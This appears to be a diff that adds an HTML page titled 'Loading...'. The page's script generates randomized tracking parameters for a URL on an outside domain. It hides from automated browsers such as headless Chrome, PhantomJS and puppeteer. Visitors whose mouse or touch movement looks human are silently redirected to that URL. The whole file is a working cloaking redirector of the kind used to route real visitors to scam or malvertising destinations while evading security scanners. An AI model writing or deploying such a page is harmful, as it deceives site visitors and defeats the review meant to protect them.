@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="referrer" content="no-referrer" />
+<title>Loading...</title>
+<style>
+  body{margin:0;background:#f5f5f7;}
+  #warn{display:none;color:#b33;font-family:Arial;padding:20px;text-align:center;}
+</style>
+</head>
+
+<body>
+<div id="warn"></div>
+
+<script>
+(function(){
+
+  // Random generator
+  function r(n){
+    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    let out = "";
+    for(let i=0;i<n;i++){
+      out += chars[Math.floor(Math.random()*chars.length)];
+    }
+    return out;
+  }
+
+  // Generate random subs
+  const sub1 = r(12);
+  const sub2 = r(12);
+  const sub3 = r(12);
+  const sub4 = r(12);
+  const sub5 = r(12);
+
+  const TARGET =
+    "https://www.therebths.com/9HF976T/2RCP16WK/"
+    + "?source_id=" + r(8)
+    + "&sub1=" + sub1
+    + "&sub2=" + sub2
+    + "&sub3=" + sub3
+    + "&sub4=" + sub4
+    + "&sub5=" + sub5;
+
+  let interacted = false, movementScore = 0, chaosScore = 0, interactionTime = null;
+  const warn = document.getElementById("warn");
+
+  // Environment check
+  function envSuspicious(){
+    const ua = navigator.userAgent;
+    if (navigator.webdriver) return true;
+    if (/HeadlessChrome|PhantomJS|puppeteer/i.test(ua)) return true;
+    return false;
+  }
+
+  // Human pattern detection
+  function evaluateHumanity(){
+    const elapsed = Date.now() - interactionTime;
+    if (elapsed < 500) return false;
+    if (movementScore < 12) return false;
+    if (chaosScore < 4) return false;
+    return true;
+  }
+
+  function recordMouseMove(e){
+    interacted = true;
+    if (!interactionTime) interactionTime = Date.now();
+    movementScore++;
+    const randomness = Math.random() * e.movementX + Math.random() * e.movementY;
+    if (randomness % 3 !== 0) chaosScore++;
+  }
+
+  function recordTouch(e){
+    interacted = true;
+    if (!interactionTime) interactionTime = Date.now();
+    movementScore++;
+    if (e.touches && e.touches[0]){
+      const p = e.touches[0].force || 0.2;
+      if (p > 0.15 && p < 0.9) chaosScore++;
+    }
+  }
+
+  setInterval(()=>{
+    if (envSuspicious()){
+      warn.style.display = "block";
+      warn.textContent = "Suspicious browser environment detected.";
+      return;
+    }
+    if (interacted && evaluateHumanity()){
+      window.location.href = TARGET;
+    }
+  }, 250);
+
+  // listeners
+  window.addEventListener("mousemove", recordMouseMove, {passive:true});
+  window.addEventListener("touchstart", recordTouch, {passive:true});
+  window.addEventListener("touchmove", recordTouch, {passive:true});
+
+})();
+</script>
+
+</body>
+</html>
